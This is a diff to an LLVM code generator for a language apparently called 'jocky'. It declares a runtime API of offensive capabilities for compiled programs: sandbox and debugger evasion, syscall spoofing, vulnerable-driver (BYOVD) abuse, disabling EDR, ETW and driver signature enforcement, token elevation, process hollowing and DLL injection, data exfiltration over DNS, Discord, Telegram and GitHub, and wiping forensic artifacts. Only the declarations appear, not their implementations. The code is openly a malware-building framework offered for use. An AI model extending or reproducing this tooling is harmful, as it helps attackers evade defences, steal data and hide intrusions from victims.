@@ -79,12 +79,13 @@ std::unique_ptr<llvm::Module> CodeGen::generate(Program& prog, const std::string
         }
     }
 
-    // Declare runtime init function (unless skipped)
+    // Declare runtime init function and all known runtime functions
     if (!noRuntime) {
         llvm::FunctionType* rtFT = llvm::FunctionType::get(
             llvm::Type::getInt32Ty(ctx), false);
         llvm::Function::Create(rtFT, llvm::Function::ExternalLinkage,
                                "jocky_runtime_init", mod.get());
+        registerRuntimeFFI();
     }
 
     // Emit function bodies
@@ -436,6 +437,159 @@ llvm::Value* CodeGen::emitCall(CallExpr& call) {
     }
 
     return builder->CreateCall(f, args, call.name + "_call");
+}
+
+void CodeGen::registerRuntimeFFI() {
+    auto* llvmI1  = llvm::Type::getInt1Ty(ctx);
+    auto* llvmI8  = llvm::Type::getInt8Ty(ctx);
+    auto* llvmI32 = llvm::Type::getInt32Ty(ctx);
+    auto* llvmI64 = llvm::Type::getInt64Ty(ctx);
+    auto* llvmPtr = llvm::PointerType::get(ctx, 0);
+    auto* llvmVd  = llvm::Type::getVoidTy(ctx);
+
+    JType jtVoid = JType::makeVoid();
+    JType jtBool = JType::makeBool();
+    JType jtI8   = JType::makeI8();
+    JType jtI32  = JType::makeI32();
+    JType jtI64  = JType::makeI64();
+    JType jtPtr  = JType::makePtr(JType::makeI8());
+
+    /* Create an external LLVM declaration and register in the funcs map.
+     * Skips LLVM creation if the function already exists (e.g. runtime_init),
+     * but always updates the funcs map so inferType() works for call sites. */
+    auto decl = [&](const char* name,
+                    llvm::Type* retLLVM, JType retJT,
+                    std::initializer_list<llvm::Type*> llvmParams,
+                    std::initializer_list<JType> jtParams) {
+        if (!mod->getFunction(name)) {
+            auto* ft = llvm::FunctionType::get(retLLVM,
+                llvm::ArrayRef<llvm::Type*>(llvmParams), false);
+            llvm::Function::Create(ft, llvm::Function::ExternalLinkage,
+                                   name, mod.get());
+        }
+        FuncSig sig;
+        sig.ret = retJT;
+        for (const auto& p : jtParams) sig.params.push_back(p);
+        funcs[name] = sig;
+    };
+
+    // ── Runtime init ─────────────────────────────────────────────────────
+    decl("jocky_runtime_init", llvmI32, jtI32, {}, {});
+
+    // ── Anti-analysis ────────────────────────────────────────────────────
+    decl("jocky_check_analysis_environment", llvmI32, jtI32, {}, {});
+    decl("jocky_is_debugger_present",        llvmI1,  jtBool, {}, {});
+    decl("jocky_is_remote_debugger",         llvmI1,  jtBool, {}, {});
+    decl("jocky_check_hardware_breakpoints", llvmI1,  jtBool, {}, {});
+    decl("jocky_is_vm",                      llvmI1,  jtBool, {}, {});
+    decl("jocky_is_sandbox",                 llvmI1,  jtBool, {}, {});
+    decl("jocky_check_timing_rdtsc",         llvmI1,  jtBool, {}, {});
+    decl("jocky_check_timing_api",           llvmI1,  jtBool, {}, {});
+
+    // ── Evasion ──────────────────────────────────────────────────────────
+    decl("jocky_unhook_ntdll",       llvmI1,  jtBool, {}, {});
+    decl("jocky_get_syscall_number", llvmI32, jtI32,  {llvmPtr}, {jtPtr});
+    decl("jocky_get_syscall_num",    llvmI32, jtI32,  {llvmPtr}, {jtPtr});
+    decl("jocky_direct_syscall",     llvmI64, jtI64,
+         {llvmI32, llvmI64, llvmI64, llvmI64, llvmI64},
+         {jtI32,  jtI64,  jtI64,  jtI64,  jtI64});
+    decl("jocky_direct_syscall4",    llvmI64, jtI64,
+         {llvmI32, llvmI64, llvmI64, llvmI64, llvmI64},
+         {jtI32,  jtI64,  jtI64,  jtI64,  jtI64});
+    decl("jocky_find_ret_gadget",    llvmPtr, jtPtr,  {}, {});
+    decl("jocky_spoof_call",         llvmI64, jtI64,
+         {llvmPtr, llvmI64, llvmI64, llvmI64, llvmI64},
+         {jtPtr,  jtI64,  jtI64,  jtI64,  jtI64});
+    decl("jocky_spoof_syscall",      llvmI64, jtI64,
+         {llvmI32, llvmI64, llvmI64, llvmI64, llvmI64},
+         {jtI32,  jtI64,  jtI64,  jtI64,  jtI64});
+
+    // ── BYOVD / Driver interaction ────────────────────────────────────────
+    decl("jocky_byovd_load",        llvmI1, jtBool,
+         {llvmPtr, llvmPtr, llvmPtr}, {jtPtr, jtPtr, jtPtr});
+    decl("jocky_byovd_unload",      llvmVd, jtVoid,  {llvmPtr}, {jtPtr});
+    decl("jocky_manifest_load",     llvmI1, jtBool,  {}, {});
+    decl("jocky_driver_read_phys",  llvmI1, jtBool,
+         {llvmPtr, llvmI64, llvmPtr, llvmI32}, {jtPtr, jtI64, jtPtr, jtI32});
+    decl("jocky_driver_write_phys", llvmI1, jtBool,
+         {llvmPtr, llvmI64, llvmPtr, llvmI32}, {jtPtr, jtI64, jtPtr, jtI32});
+    decl("jocky_driver_read_msr",   llvmI1, jtBool,
+         {llvmPtr, llvmI32, llvmPtr}, {jtPtr, jtI32, jtPtr});
+    decl("jocky_driver_write_msr",  llvmI1, jtBool,
+         {llvmPtr, llvmI32, llvmI64}, {jtPtr, jtI32, jtI64});
+    decl("jocky_driver_map_phys",   llvmI1, jtBool,
+         {llvmPtr, llvmI64, llvmI32, llvmPtr}, {jtPtr, jtI64, jtI32, jtPtr});
+    decl("jocky_driver_invoke",     llvmI1, jtBool,
+         {llvmPtr, llvmPtr, llvmPtr, llvmI32, llvmPtr, llvmI32},
+         {jtPtr,  jtPtr,  jtPtr,  jtI32,  jtPtr,  jtI32});
+
+    // ── Kernel exploitation ───────────────────────────────────────────────
+    decl("jocky_kread",                 llvmI1, jtBool,
+         {llvmPtr, llvmI64, llvmPtr, llvmI32}, {jtPtr, jtI64, jtPtr, jtI32});
+    decl("jocky_kwrite",                llvmI1, jtBool,
+         {llvmPtr, llvmI64, llvmPtr, llvmI32}, {jtPtr, jtI64, jtPtr, jtI32});
+    decl("jocky_disable_edr_callbacks", llvmI1, jtBool, {llvmPtr}, {jtPtr});
+    decl("jocky_disable_etw",           llvmI1, jtBool, {llvmPtr}, {jtPtr});
+    decl("jocky_strip_ppl",             llvmI1, jtBool,
+         {llvmPtr, llvmI32}, {jtPtr, jtI32});
+    decl("jocky_elevate_token",         llvmI1, jtBool,
+         {llvmPtr, llvmI32}, {jtPtr, jtI32});
+    decl("jocky_downgrade_token",       llvmI1, jtBool,
+         {llvmPtr, llvmI32}, {jtPtr, jtI32});
+    decl("jocky_disable_dse",           llvmI1, jtBool, {llvmPtr}, {jtPtr});
+    decl("jocky_restore_dse",           llvmI1, jtBool, {llvmPtr}, {jtPtr});
+
+    // ── In-memory execution ───────────────────────────────────────────────
+    decl("jocky_process_hollow", llvmI1, jtBool,
+         {llvmPtr, llvmPtr, llvmI64}, {jtPtr, jtPtr, jtI64});
+    decl("jocky_module_stomp",   llvmI1, jtBool,
+         {llvmI32, llvmPtr, llvmPtr, llvmI64}, {jtI32, jtPtr, jtPtr, jtI64});
+    decl("jocky_rdll_inject",    llvmI1, jtBool,
+         {llvmI32, llvmPtr, llvmI64}, {jtI32, jtPtr, jtI64});
+    decl("jocky_p3_poison",      llvmI1, jtBool,
+         {llvmI32, llvmPtr, llvmPtr}, {jtI32, jtPtr, jtPtr});
+    decl("jocky_thread_hijack",  llvmI1, jtBool,
+         {llvmI32, llvmPtr, llvmI64}, {jtI32, jtPtr, jtI64});
+
+    // ── Exfiltration ──────────────────────────────────────────────────────
+    decl("jocky_exfil_encrypt",  llvmI1, jtBool,
+         {llvmPtr, llvmI64, llvmPtr, llvmPtr}, {jtPtr, jtI64, jtPtr, jtPtr});
+    decl("jocky_exfil_front",    llvmI1, jtBool,
+         {llvmPtr, llvmPtr, llvmPtr, llvmPtr, llvmI64},
+         {jtPtr,  jtPtr,  jtPtr,  jtPtr,  jtI64});
+    decl("jocky_exfil_dns",      llvmI1, jtBool,
+         {llvmPtr, llvmPtr, llvmI64}, {jtPtr, jtPtr, jtI64});
+    decl("jocky_exfil_discord",  llvmI1, jtBool,
+         {llvmPtr, llvmPtr, llvmI64}, {jtPtr, jtPtr, jtI64});
+    decl("jocky_exfil_telegram", llvmI1, jtBool,
+         {llvmPtr, llvmPtr, llvmPtr, llvmI64}, {jtPtr, jtPtr, jtPtr, jtI64});
+    decl("jocky_exfil_github",   llvmI1, jtBool,
+         {llvmPtr, llvmPtr, llvmPtr, llvmI64}, {jtPtr, jtPtr, jtPtr, jtI64});
+
+    // ── Cleanup / Anti-forensics ──────────────────────────────────────────
+    decl("jocky_self_delete",     llvmI1, jtBool, {}, {});
+    decl("jocky_clear_logs",      llvmI1, jtBool, {}, {});
+    decl("jocky_wipe_artifacts",  llvmI1, jtBool, {}, {});
+    decl("jocky_wipe_prefetch",   llvmI1, jtBool, {}, {});
+    decl("jocky_patch_shimcache", llvmI1, jtBool, {}, {});
+    decl("jocky_patch_amcache",   llvmI1, jtBool, {}, {});
+    decl("jocky_clear_srum",      llvmI1, jtBool, {}, {});
+    decl("jocky_cleanup_all",     llvmI1, jtBool, {}, {});
+
+    // ── Crypto ────────────────────────────────────────────────────────────
+    decl("jocky_decrypt_xor", llvmVd, jtVoid,
+         {llvmPtr, llvmI64, llvmI8}, {jtPtr, jtI64, jtI8});
+    decl("jocky_decrypt_rc4", llvmVd, jtVoid,
+         {llvmPtr, llvmI64, llvmPtr, llvmI64}, {jtPtr, jtI64, jtPtr, jtI64});
+
+    // ── Integrity ─────────────────────────────────────────────────────────
+    decl("jocky_verify_integrity", llvmI1, jtBool, {}, {});
+
+    // ── Allocators ────────────────────────────────────────────────────────
+    decl("jocky_alloc",         llvmPtr, jtPtr,  {llvmI64}, {jtI64});
+    decl("jocky_free",          llvmVd,  jtVoid, {llvmPtr}, {jtPtr});
+    decl("jocky_byovd_new",     llvmPtr, jtPtr,  {}, {});
+    decl("jocky_byovd_destroy", llvmVd,  jtVoid, {llvmPtr}, {jtPtr});
 }
 
 } // namespace jocky
